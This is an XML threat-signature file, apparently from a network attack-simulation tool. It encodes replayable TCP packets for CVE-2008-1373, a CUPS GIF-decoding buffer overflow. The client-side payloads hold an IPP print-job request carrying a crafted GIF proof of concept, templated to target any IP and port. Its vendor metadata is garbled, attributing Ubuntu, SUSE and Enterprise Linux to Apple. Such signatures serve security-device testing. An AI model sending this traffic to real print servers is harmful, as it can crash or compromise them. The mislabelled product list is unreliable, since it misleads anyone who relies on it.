<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Multiple Vendor CUPS GIF Decoding Routine Buffer Overflow"/>
    <EngDesc display="true" value="There exists a buffer overflow vulnerability in Apple's Common Unix Printing System (CUPS) distributed by multiple vendors. The vulnerability is due to a boundary error in handling of GIF format files and may be exploited by remote attackers to compromise a vulnerable system or cause denial of service."/>
    <Intent display="true">
      <item value="BUFFER_OVERFLOW"/>
    </Intent>
    <Protocol display="true" value="NDP"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Apple"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Apple_Apple_Common_UNIX_Printing_System_(CUPS)"/>
      <item value="Apple_Apple_Mac_OS_X"/>
      <item value="Apple_Apple_Mac_OS_X_Server"/>
      <item value="Apple_Apple_Enterprise_Linux"/>
      <item value="Apple_Apple_Enterprise_Linux_Desktop"/>
      <item value="Apple_Apple_Enterprise_Linux_Desktop_Workstation"/>
      <item value="Apple_Apple_Linux"/>
      <item value="Apple_Apple_openSUSE"/>
      <item value="Apple_Apple_SUSE_Linux"/>
      <item value="Apple_Apple_Ubuntu_Linux"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Apple_Common_UNIX_Printing_System_(CUPS)_1.3.6_and_possibly_prior"/>
      <item value="Apple_Mac_OS_X_10.5.2_and_prior"/>
      <item value="Apple_Mac_OS_X_Server_10.5.2_and_prior"/>
      <item value="Apple_Enterprise_Linux_v._5_Server"/>
      <item value="Apple_Enterprise_Linux_Desktop_v._5_Client"/>
      <item value="Apple_Enterprise_Linux_Desktop_Workstation_v._5_Client"/>
      <item value="Apple_Linux_12.0"/>
      <item value="Apple_openSUSE_10.3_and_prior"/>
      <item value="Apple_SUSE_Linux_Enterprise_Desktop_10_SP1"/>
      <item value="Apple_SUSE_Linux_Enterprise_Server_10_SP1"/>
    </Known_Versions_Affected>
    <Credit display="true" value="FSC20080401-08"/>
    <CVEID display="true" value="CVE-2008-1373"/>
    <bugtraqID display="true" value="28544"/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="ThreatEx Team"/>
    <ID display="true" value="ff83434288f811dd9007000c29da7492"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="True"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="Partial"/>
    <IntegImpact display="false" value="Partial"/>
    <AvailImpact display="false" value="Partial"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value="normal"/>
    <LastModified display="false" value="633572460629218750"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value="B"/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value="1"/>
    <Regex display="false" value=""/>
    <Created value="1221854861" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="U"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="V"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="W"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="X"/>
    <NamedVar name="NDPSdestPort" type="ImperfectControls.Port" value="null" index="Y"/>
  </Variables>
  <Loops>
    <for index="D">
      <for index="U"/>
      <for index="V"/>
      <for index="W"/>
      <for index="X"/>
      <for index="Y"/>
    </for>
    <for index="G"/>
    <for index="J">
      <for index="U"/>
      <for index="V"/>
      <for index="W"/>
      <for index="X"/>
      <for index="Y"/>
    </for>
    <for index="L"/>
    <for index="O">
      <for index="U"/>
      <for index="V"/>
      <for index="W"/>
      <for index="X"/>
      <for index="Y"/>
    </for>
    <for index="P"/>
  </Loops>
  <PostScript/>
  <Output index="D" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0052" Identification="B8C4" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="1889" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="@random(1026,65535)" destPort="$NDPSdestPort" SeqNumber="C9D56CAC" AckNumber="FA07D60C" HeaderLength="08" WindowSize="05B4" Checksum="4A62" UrgentPointer="0000" Options="0101080A025BD46C00DCC703" Payload="504F5354202F7072696E746572732F7465737420485454502F312E310D0A436F6E74656E742D4C656E6774683A20313039360D0A436F6E74656E742D547970653A206170706C69636174696F6E2F6970700D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="J" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0143" Identification="B8CA" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="1792" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="@random(1026,65535)" destPort="$NDPSdestPort" SeqNumber="C9D56CFF" AckNumber="FA07D60C" HeaderLength="08" WindowSize="05B4" Checksum="253E" UrgentPointer="0000" Options="0101080A025BD46C00DCC703" Payload="486F73743A203137322E31362E382E3230360D0A0D0A010100020000000101470012617474726962757465732D6368617273657400057574662D3848001B617474726962757465732D6E61747572616C2D6C616E67756167650005656E2D757345000B7072696E7465722D75726900246970703A2F2F3137322E31362E382E3230363A3633312F7072696E746572732F7465737442001472657175657374696E672D757365722D6E616D650004726F6F744200086A6F622D6E616D650007706F632E67696649000F646F63756D656E742D666F726D617400186170706C69636174696F6E2F6F637465742D73747265616D0242000A6A6F622D73686565747300046E6F6E6542000000046E6F6E65034749463839613A000B00F70000000000800000008000808000000080800080008080808080C0C0C0FF000000FF00FFFF000000FFFF00FF00FFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000330000660000990000CC0000FF0033000033330033660033990033CC0033FF0066000066330066660066990066CC0066FF0099000099330099660099990099CC0099FF00CC0000CC3300CC6600CC9900CCCC00CCFF00FF0000FF3300FF6600FF9900FFCC00FFFF3300003300333300663300993300CC3300FF3333003333333333663333993333CC3333FF3366003366333366663366993366CC3366FF3399003399333399663399993399CC3399FF33CC0033CC3333CC6633CC9933CCCC33CCFF33FF0033FF3333FF6633FF9933FFCC33FFFF6600006600336600666600996600CC6600FF6633006633336633666633996633CC6633FF6666006666336666666666996666CC6666FF6699006699336699666699996699CC6699FF66CC0066CC3366CC6666CC9966CCCC66CCFF66FF0066FF3366FF6666FF9966FFCC66FFFF9900009900339900669900999900CC9900FF9933009933339933669933999933CC9933FF9966009966339966669966999966CC9966FF9999009999339999669999999999CC9999FF99CC0099CC3399CC6699CC9999CCCC99CCFF99FF0099FF3399FF6699FF9999FFCC99FFFFCC0000CC0033CC0066CC0099CC00CCCC00FFCC3300CC3333CC3366CC3399CC33CCCC33FFCC6600CC6633CC6666CC6699CC66CCCC66FFCC9900CC9933CC9966CC9999CC99CCCC99FFCCCC00CCCC33CCCC66CCCC99CCCCCCCCCCFFCCFF00CCFF33CCFF66CCFF99CCFFCCCCFFFFFF0000FF0033FF0066FF0099FF00CCFF00FFFF3300FF3333FF3366FF3399FF33CCFF33FFFF6600FF6633FF6666FF6699FF66CCFF66FFFF9900FF9933FF9966FF9999FF99CCFF99FFFFCC00FFCC33FFCC66FFCC99FFCCCCFFCCFFFFFF00FFFF33FFFF66FFFF99FFFFCCFFFFFF21F90401000010002C000000003A000B00000D2C00FF091C48B0A0C18308132A5CC8B0A1C38710234A9C48B1A2C58B125160DCC8B1A3C78F20438A1C49126340003B" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="O" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="B8CE" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="189D" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="@random(1026,65535)" destPort="$NDPSdestPort" SeqNumber="C9D5715D" AckNumber="FA07D6D3" HeaderLength="08" WindowSize="06C0" Checksum="D86F" UrgentPointer="0000" Options="0101080A025BD48E00DCC71B" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1,3,5">
    <Output index="G" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="110F" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="C05C" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="" destPort="" SeqNumber="FA07D60C" AckNumber="C9D56CCA" HeaderLength="08" WindowSize="05A8" Checksum="DF1B" UrgentPointer="0000" Options="0101080A00DCC703025BD46C" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
    <Output index="L" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="1115" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="C056" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="" destPort="" SeqNumber="FA07D60C" AckNumber="C9D56E0E" HeaderLength="08" WindowSize="06B4" Checksum="DCCA" UrgentPointer="0000" Options="0101080A00DCC704025BD46C" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C2030382041707220323030382030303A33373A303820474D540D0A5365727665723A20435550532F312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A4B6565702D416C6976653A2074696D656F75743D36300D0A436F6E74656E742D4C616E67756167653A20656E5F55530D0A436F6E74656E742D547970653A206170706C69636174696F6E2F6970700D0A436F6E74656E742D4C656E6774683A203138360D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
    <Output index="P" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00EE" Identification="111B" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="BF96" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="" destPort="" SeqNumber="FA07D6D3" AckNumber="C9D5715D" HeaderLength="08" WindowSize="085C" Checksum="B260" UrgentPointer="0000" Options="0101080A00DCC71B025BD48E" Payload="010100000000000101470012617474726962757465732D6368617273657400057574662D3848001B617474726962757465732D6E61747572616C2D6C616E67756167650005656E2D7573024500076A6F622D7572690027687474703A2F2F646863703230362E7672742E74656C75732E636F6D3A3633312F6A6F62732F342100066A6F622D69640004000000042300096A6F622D73746174650004000000034400116A6F622D73746174652D726561736F6E7300046E6F6E6503" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
